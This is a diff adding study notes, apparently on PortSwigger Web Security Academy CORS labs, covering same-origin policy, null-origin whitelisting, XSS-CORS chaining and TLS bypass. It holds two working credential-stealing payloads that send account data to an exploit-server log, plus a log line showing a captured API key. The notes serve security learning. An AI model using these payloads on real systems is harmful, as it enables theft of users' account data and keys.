@@ -144,9 +144,9 @@ Circumvented using web proxies, VPNs, or manipulation of client-side geolocation
 
 - Aims to prevent websites from attacking each other.
 - An origin consists of a URI scheme, domain and port number.
-- Without the same-origin policy, if you visited a malicious website it could send requests to other websites (Facebook, Gmail) whose cookies are already present in the browser.
-- SOP allows embedding of images via the ```<img>``` tag, media via the ```<video>``` tag and JavaScript includes with the ```<script>``` tag.
-- Any JavaScript on the page won't be able to read the contents of the above resources. 
+- Without the same-origin policy, if you visited a malicious website, it could send requests to other websites (Facebook, Gmail) whose cookies are already present in the browser and therefore an attacker could retrieve sensitive data.
+- SOP only allows embedding of images via the ```<img>``` tag, media via the ```<video>``` tag and JavaScript includes with the ```<script>``` tag.
+- **Any JavaScript on the page won't be able to read the contents of the above resources.**
 - SOP more relaxed when dealing with cookies, can be accessible from subdomains.
 - Possible to relax same-origin policy using document.domain.
 
@@ -233,4 +233,92 @@ Submit exploit to victim and go to /log:
 
 ### Errors parsing Origin headers
 
-...
+- Multiple origin access using a whitelist of allowed origins.
+- Supplied origin is compared to the whitelist.
+- These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions.
+
+### Whitelisted null origin value
+
+- Origin header supports the value ```null```.
+- Whitelist the null origin to support local development.
+	- Cross-site redirects.
+	- Requests from serialized data.
+	- Request using the file: protocol.
+	- Sandboxed cross-origin requests.
+- Sandboxed iframe cross-origin request:
+
+#### [Lab]: CORS vulnerability with trusted null origin
+
+Send this to the victim.
+
+```
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://acbd1fbe1fd78cf3807331b900be00fc.web-security-academy.net/accountDetails',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+location='https://ac6c1fc91feb8cf080ee316001f5002a.web-security-academy.net/log?key='+this.responseText;
+};
+</script>"></iframe> 
+```
+
+Check the log
+
+```
+192.168.1.12    2020-02-06 19:27:31 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22oyEfZl4UJC3kIc6IvycliwYYSdIwliXj%22} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/939914"
+```
+
+## Exploiting XSS via CORS trust relationships 
+
+- If Website A trusts Website B, and Website B is vulnerable to XSS
+- Attack can exploit XSS to inject JavaScript that uses CORS to retrieve sensitive information.
+
+Given the following request
+
+```
+GET /api/requestApiKey HTTP/1.1
+Host: vulnerable-website.com
+```
+
+If the following origins are allowed
+
+```
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
+```
+
+You could chain CORS and XSS as follows
+
+``` https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>```
+
+## Breaking TLS with poorly configured CORS
+
+- An application uses HTTPS but whitelists a trusted subdomain that is using plain HTTP.
+
+1. The victim user makes any plain HTTP request.
+2. The attacker injects a redirection to: http://trusted-subdomain.vulnerable-website.com
+3. The victim's browser follows the redirect.
+4. The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to: https://vulnerable-website.com
+5. The victim's browser makes the CORS request, including the origin: http://trusted-subdomain.vulnerable-website.com
+6. The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
+7. The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.
+
+### [Lab]: CORS vulnerability with trusted insecure protocols
+
+```
+<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://ac141fb91e0fb1fb80430683009d0046.web-security-academy.net/my-account?id=administrator',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+	location = "https://ac061f511ee2b1b680d60692012f00fd.web-security-academy.net/log?key=this.responseText";
+}
+</script>
+```
+
